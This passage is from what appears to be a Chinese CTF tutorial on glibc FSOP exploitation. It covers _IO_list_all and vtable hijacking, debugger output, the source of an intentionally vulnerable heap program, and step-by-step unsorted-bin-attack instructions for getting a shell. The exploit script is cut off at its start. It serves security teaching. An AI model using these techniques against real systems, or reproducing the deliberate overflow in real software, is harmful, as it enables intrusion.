</pre></table></code></div></div><p><img data-src="/assets/img/2022/image-20221207001822307.png" alt="image-20221207001822307" data-proofer-ignore></p><h2 id="0x03-io_file入门fsop">0x03 IO_FILE入门：FSOP<a href="#0x03-io_file入门fsop" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>FSOP利用的本质也是需要去call fake vtable来劫持程序控制流，只是如何去达成call fake vtable的过程有些不一样而已。</p><p>利用需要劫持<code class="language-plaintext highlighter-rouge">_IO_list_all</code>，使其指向恶意构造的file structure, 恶意构造的file structure需要控制好<code class="language-plaintext highlighter-rouge">_chain</code>与<code class="language-plaintext highlighter-rouge">vtable</code>, 使得最终可以通过call vtable，实现<code class="language-plaintext highlighter-rouge">call system("/bin/sh")</code></p><p><img data-src="/assets/img/2022/image-20221208214530813.png" alt="image-20221208214530813" data-proofer-ignore></p><p>构造好这个fp chain，触发的时机是通过调用<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>，会触发<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>函数的场景有：</p><ul><li>glibc abort routine<li>exit function<li>main return</ul><p><img data-src="/assets/img/2022/image-20221208232041252.png" alt="image-20221208232041252" data-proofer-ignore></p><p>见<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>源码：</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kt">int</span>
<span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">last_stamp</span><span class="p">;</span>
  <span class="c1">//...</span>
  <span class="n">last_stamp</span> <span class="o">=</span> <span class="n">_IO_list_all_stamp</span><span class="p">;</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">run_fp</span> <span class="o">=</span> <span class="n">fp</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
	<span class="n">_IO_flockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
		
      <span class="c1">// 关键在这里</span>
      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>  
<span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span>	   <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
	       <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
				    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
<span class="cp">#endif
</span>	   <span class="p">)</span>
	  <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
          
<span class="cp">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</span></pre></table></code></div></div><blockquote><p>目的是可以触发到<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW (fp, EOF) == EOF)</code>，它会调用vtable的<code class="language-plaintext highlighter-rouge">_overflow</code>函数。程序实际执行逻辑是：取到fp-&gt;vtable中的值，得到vtable的地址，在加上0x18的偏移，得到记录<code class="language-plaintext highlighter-rouge">_overflow</code>函数的地址，然后执行该地址处的函数，即call <code class="language-plaintext highlighter-rouge">overflow</code>函数。</p><p>为什么是0x18?</p><p>因为通常vtable指向的是<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>，它是<code class="language-plaintext highlighter-rouge">_IO_jump_t</code>类型的结构体，记录了一堆函数。可以看到<code class="language-plaintext highlighter-rouge">_IO_file_overflow</code>(也就是<code class="language-plaintext highlighter-rouge">_overflow</code>)的偏移是0x18</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>vtable <span class="o">=</span> 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
pwndbg&gt; p &amp;_IO_file_jumps
<span class="nv">$3</span> <span class="o">=</span> <span class="o">(</span>const struct _IO_jump_t <span class="k">*</span><span class="o">)</span> 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
pwndbg&gt; tele 0x7ffff7dd06e0
00:0000│  0x7ffff7dd06e0 <span class="o">(</span>_IO_file_jumps<span class="o">)</span> ◂— 0x0
01:0008│  0x7ffff7dd06e8 <span class="o">(</span>_IO_file_jumps+8<span class="o">)</span> ◂— 0x0
02:0010│  0x7ffff7dd06f0 <span class="o">(</span>_IO_file_jumps+16<span class="o">)</span> —▸ 0x7ffff7a869d0 <span class="o">(</span>_IO_file_finish<span class="o">)</span> ◂— push   rbx
03:0018│  0x7ffff7dd06f8 <span class="o">(</span>_IO_file_jumps+24<span class="o">)</span> —▸ 0x7ffff7a87740 <span class="o">(</span>_IO_file_overflow<span class="o">)</span> ◂— mov    ecx, dword ptr <span class="o">[</span>rdi]
04:0020│  0x7ffff7dd0700 <span class="o">(</span>_IO_file_jumps+32<span class="o">)</span> —▸ 0x7ffff7a874b0 <span class="o">(</span>_IO_file_underflow<span class="o">)</span> ◂— mov    eax, dword ptr <span class="o">[</span>rdi]
05:0028│  0x7ffff7dd0708 <span class="o">(</span>_IO_file_jumps+40<span class="o">)</span> —▸ 0x7ffff7a88610 <span class="o">(</span>_IO_default_uflow<span class="o">)</span> ◂— mov    rax, qword ptr <span class="o">[</span>rdi + 0xd8]
06:0030│  0x7ffff7dd0710 <span class="o">(</span>_IO_file_jumps+48<span class="o">)</span> —▸ 0x7ffff7a89990 <span class="o">(</span>_IO_default_pbackfail<span class="o">)</span> ◂— push   r15
07:0038│  0x7ffff7dd0718 <span class="o">(</span>_IO_file_jumps+56<span class="o">)</span> —▸ 0x7ffff7a861f0 <span class="o">(</span>_IO_file_xsputn<span class="o">)</span> ◂— xor    eax, eax
pwndbg&gt;
08:0040│  0x7ffff7dd0720 <span class="o">(</span>_IO_file_jumps+64<span class="o">)</span> —▸ 0x7ffff7a85ed0 <span class="o">(</span>__GI__IO_file_xsgetn<span class="o">)</span> ◂— push   r14
09:0048│  0x7ffff7dd0728 <span class="o">(</span>_IO_file_jumps+72<span class="o">)</span> —▸ 0x7ffff7a854d0 <span class="o">(</span>_IO_file_seekoff<span class="o">)</span> ◂— push   r14
0a:0050│  0x7ffff7dd0730 <span class="o">(</span>_IO_file_jumps+80<span class="o">)</span> —▸ 0x7ffff7a88a10 <span class="o">(</span>_IO_default_seekpos<span class="o">)</span> ◂— mov    rax, qword ptr <span class="o">[</span>rdi + 0xd8]
0b:0058│  0x7ffff7dd0738 <span class="o">(</span>_IO_file_jumps+88<span class="o">)</span> —▸ 0x7ffff7a85440 <span class="o">(</span>_IO_file_setbuf<span class="o">)</span> ◂— push   rbx
0c:0060│  0x7ffff7dd0740 <span class="o">(</span>_IO_file_jumps+96<span class="o">)</span> —▸ 0x7ffff7a85380 <span class="o">(</span>_IO_file_sync<span class="o">)</span> ◂— push   rbx
0d:0068│  0x7ffff7dd0748 <span class="o">(</span>_IO_file_jumps+104<span class="o">)</span> —▸ 0x7ffff7a7a190 <span class="o">(</span>_IO_file_doallocate<span class="o">)</span> ◂— push   r12
0e:0070│  0x7ffff7dd0750 <span class="o">(</span>_IO_file_jumps+112<span class="o">)</span> —▸ 0x7ffff7a861b0 <span class="o">(</span>_IO_file_read<span class="o">)</span> ◂— <span class="nb">test   </span>byte ptr <span class="o">[</span>rdi + 0x74], 2
0f:0078│  0x7ffff7dd0758 <span class="o">(</span>_IO_file_jumps+120<span class="o">)</span> —▸ 0x7ffff7a85b80 <span class="o">(</span>_IO_file_write<span class="o">)</span> ◂— <span class="nb">test   </span>rdx, rdx
</pre></table></code></div></div></blockquote><blockquote><p><strong>同时，很重要的一点是</strong></p><p>vtable是没有做对齐检查的，这是什么意思呢？</p><p><code class="language-plaintext highlighter-rouge">FILE-&gt;vtable</code>指向的应该是一个<code class="language-plaintext highlighter-rouge">_IO_jump_t</code>结构体类型的<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>变量，在取<code class="language-plaintext highlighter-rouge">fp-&gt;vtable</code>值的时候不会去检查是不是指向了结构体的开头，而是直接拿到vtable地址，然后在该地址上直接加上0x18，就得到目标函数的地址了。</p><p>认清楚这一点对于bypass glibc2.24中新增的vtable check至关重要。</p></blockquote><p>继续说回<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>，我们知道了目标是<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW (fp, EOF) == EOF</code>，触发这行代码之前需要满足一些条件：</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>  
<span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span>	   <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
	       <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
				    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
</pre></table></code></div></div><p>也就是满足以下两种条件其一即可</p><ul><li><code class="language-plaintext highlighter-rouge">fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code><li><code class="language-plaintext highlighter-rouge">_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code></ul><p>继续说回FSOP，在劫持<code class="language-plaintext highlighter-rouge">_IO_list_all</code>时，在CTF中比较常见的场景是通过unsorted bin attack劫持<code class="language-plaintext highlighter-rouge">_IO_list_all</code>，使其指向<code class="language-plaintext highlighter-rouge">bin (main_arena)</code>，而file structure中<code class="language-plaintext highlighter-rouge">_chain</code>的偏移是0x68（64bit下），对应了<code class="language-plaintext highlighter-rouge">bin</code>中<code class="language-plaintext highlighter-rouge">smallbin[4]</code>的位置。</p><p>就如经典题目house of orange，最终FSOP利用成功时，fp chain如下图所示</p><p><img data-src="/assets/img/2022/file_structure-FSOP.drawio-0672268.svg" alt="file_structure-FSOP.drawio" data-proofer-ignore></p><hr /><p>接下来，通过一个小程序入门FSOP</p><p>magicalloc.c，使用glibc2.23编译，<a href="/assets/file/magicalloc">程序获取</a></p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;alloca.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
</span>
<span class="kt">void</span> <span class="nf">init_proc</span><span class="p">(){</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">long</span> <span class="kt">long</span> <span class="nf">read_long</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
    <span class="kt">long</span> <span class="kt">long</span> <span class="n">choice</span><span class="p">;</span>
    <span class="n">__read_chk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">24</span><span class="p">);</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="n">atoll</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">choice</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">read_input</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">__read_chk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"read error"</span><span class="p">);</span>
        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">ret</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">){</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">ret</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\x00'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">heap</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
<span class="n">bool</span> <span class="n">is_free</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">allocate</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">heap</span><span class="p">[</span><span class="n">i</span><span class="p">]){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"size: "</span><span class="p">);</span>
            <span class="n">size</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="mh">0x78</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span><span class="p">){</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"too small or large"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">heap</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">heap</span><span class="p">[</span><span class="n">i</span><span class="p">]){</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"error!"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"too more!"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>



<span class="kt">void</span> <span class="nf">dfree</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">){</span>
        <span class="n">free</span><span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
        <span class="n">heap</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"too large"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">edit</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"index: "</span><span class="p">);</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"size:"</span><span class="p">);</span>
        <span class="n">size</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"data:"</span><span class="p">);</span>
        <span class="n">read_input</span><span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="n">size</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"too large"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">show</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="n">idx</span><span class="p">]){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"name: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"context: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">heap</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"too large"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">menu</span><span class="p">(){</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"*************************"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"      magic allocate     "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"*************************"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">" 1. alloc                "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">" 2. free                 "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">" 3. edit                 "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">" 4. show                 "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">" 5. exit                 "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"*************************"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"your choice:"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">init_proc</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"name: "</span><span class="p">);</span>
    <span class="n">read_input</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">menu</span><span class="p">();</span>
        <span class="k">switch</span><span class="p">(</span><span class="n">read_long</span><span class="p">()){</span>
            <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">allocate</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">is_free</span><span class="p">){</span>
                    <span class="n">dfree</span><span class="p">();</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="n">puts</span><span class="p">(</span><span class="s">"no more free!"</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="n">is_free</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">edit</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">show</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>❯ ldd magicalloc
        linux-vdso.so.1 <span class="o">(</span>0x00007ffff7ffb000<span class="o">)</span>
        libc.so.6 <span class="o">=&gt;</span> /home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 <span class="o">(</span>0x00007ffff7806000<span class="o">)</span>
        /home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so <span class="o">=&gt;</span> /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007ffff7dd3000<span class="o">)</span>
❯ checksec ./magicalloc
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/sirius/ctf/file_structure/magicalloc'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b<span class="s1">'/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/'</span>
    FORTIFY:  Enabled
</pre></table></code></div></div><p>分析一下这个程序：</p><ol><li><p>因为name和heap变量挨着，通过塞满name，在show的时候可以顺带着leak出heap地址</p><li>edit函数很明显存在一个越界写，可以通过unsorted bin的fp leak出libc地址<li>程序设定了只能free一次。在free过一个chunk进入unsorted bin后不能再free了（下面统称这个chunk为chunkA)<li>可以通过越界写，构造实现FSOP的fp chain<li><p>利用越界写，将chunkA的size修改为0x61，伪造成一个small bin[4]；将chunkA的bk改为<code class="language-plaintext highlighter-rouge">_IO_list_all-0x10</code>，构造unsorted bin attack；chunkA作为file structure，构造满足FSOP的条件：主要是<code class="language-plaintext highlighter-rouge">_IO_write_ptr &gt; _IO_write_base</code></p><li>进行malloc，处理unsorted bin时会将chunkA 放入到smallbin[4]中，同时在对chunkA做unlink时，触发unsorted bin attack。将<code class="language-plaintext highlighter-rouge">_IO_list_all</code>指向<code class="language-plaintext highlighter-rouge">bin</code>，chunkA也已经构造好FSOP的条件了<li>现在只需要触发<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>，因为完成unsorted bin attack后，unsorted bin的bk会变成<code class="language-plaintext highlighter-rouge">&amp;_IO_list_all-0x10</code>，如果把这片内存当做chunk，其chunk size是0，是非法的。所以在上一条进行malloc，处理unsorted bin时就会引发malloc异常，触发<code class="language-plaintext highlighter-rouge">malloc_printerr-&gt;_libc_message-&gt;abort-&gt;_IO_flush_all_lockp</code><li>最终拿到shell</ol><p><strong>exp:</strong></p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'split'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
